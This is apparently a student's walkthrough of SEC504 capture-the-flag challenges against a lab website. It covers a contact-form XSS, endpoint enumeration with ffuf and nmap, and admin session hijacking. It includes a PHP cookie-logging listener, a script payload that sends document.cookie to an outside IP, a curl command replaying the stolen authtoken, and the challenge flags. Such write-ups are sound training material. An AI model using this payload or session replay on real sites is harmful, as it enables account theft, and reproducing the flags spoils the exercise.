# SEC504 Ranges.io CTF - Walkthrough

This document contains my step-by-step solutions for the **www.issplaylist.com** section challenges. 
Each section includes **question**, **steps taken**, and **answer/flag**.

---

## Contact
**Question:** 
Interact with the contact form on the www.issplaylist.com website. What is the flag returned as the reference number?

**Steps Taken:**
1. Navigated to <https://www.issplaylist.com/contact.html>.
2. Typed `Mike` in the first name form box and clicked **Submit**.
3. The response page displayed the flag.

**Flag:** 
`NetWars{ReceivedSubmission}`

---

## Vulnerability Discovery
**Question:** 
Explore the Contact page on the www.issplaylist.com website to identify a vulnerability. Identify the type of vulnerability.

**Steps Taken:**
1. Navigated to <https://www.issplaylist.com/contact.html>.
2. First tested **command injection** in all form fields to check for interesting errors; none were found.
3. Next tested **Cross-Site Scripting (XSS)** since other attack types didn’t fit the page’s functionality. Submitted:
   ```html
   Mike<script>alert(1)</script>
   ```
   The First Name field immediately triggered an alert, confirming XSS.

**Answer:** 
`Cross-Site Scripting`

---

## Information Gathering
**Question:** 
Identify the hidden page on the www.issplaylist.com server. Submit the page name (XXXXX.html).

**Steps Taken:**
1. Enumerated website endpoints using **ffuf**:
   ```bash
   ffuf -w common.txt -u https://www.issplaylist.com/FUZZ -s -mc 200,301
   ```
2. The following endpoints were found: `admin`, `images`, `index.html`, `res`.
3. Tested each endpoint:
   - `images` and `res` → Forbidden
   - `index.html` → Accessible (main page)
   - `admin` → Accessible (hidden admin page)
4. Alternative method with **Nmap** script scan:
   ```bash
   nmap -n --script=http-enum www.issplaylist.com
   ```

**Answer:** 
`admin.html`

---

## Cookie Theft
**Question:** 
Administrators for the www.issplaylist.com site frequently examine the contact page submissions using their browsers. Exploit the site vulnerability to steal cookie content from the administrator. What is the name of the cookie used to authenticate administrative users?

**Steps Taken:**
1. Used the course cookie catcher lab script (slightly modified) to log inbound requests:

   ```php
   <?php
   // Build log entry
   $data = [
       'GET'     => $_GET,
       'POST'    => $_POST,
       'headers' => function_exists('getallheaders') ? getallheaders() : [],
   ];

   // Convert to JSON
   $json = json_encode($data, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);

   // Append to cookies.log
   file_put_contents("cookies.log", $json . PHP_EOL, FILE_APPEND);

   // (Optional) If running via CLI SAPI, also print to stdout
   if (defined('STDOUT')) {
       fwrite(STDOUT, $json . PHP_EOL);
   }

   // Send no content back to browser
   http_response_code(204);
   exit;
   ?>
   ```

2. Started a listener:
   ```bash
   php -S 0.0.0.0:8080
   ```

3. Exploited the XSS in the First Name field to exfiltrate the cookie:
   ```html
   Mike<script>document.location="http://10.142.148.3:8080/" + document.cookie</script>
   ```

4. Monitored the terminal and `cookies.log` for the incoming request from the admin’s browser to identify the authentication cookie name.

5. *Cookie name captured in `cookies.log` after the admin views the submission (record from the exfiltrated request).* In my case it was `/authtoken=0f186582606b62965d90e772e76a8a5620b11af9`

**Answer:** 
`authtoken`

---

## Unauthorized Access
**Question:** Use the stolen cookie to access the admin page. Submit the flag.

**Steps Taken:**
1. Using the command line, `curl -k -b "authtoken=0f186582606b62965d90e772e76a8a5620b11af9" https://www.issplaylist.com/admin.html | grep -i NetWars`

**Flag:**
`NetWars{CongratsAdmin}`

---
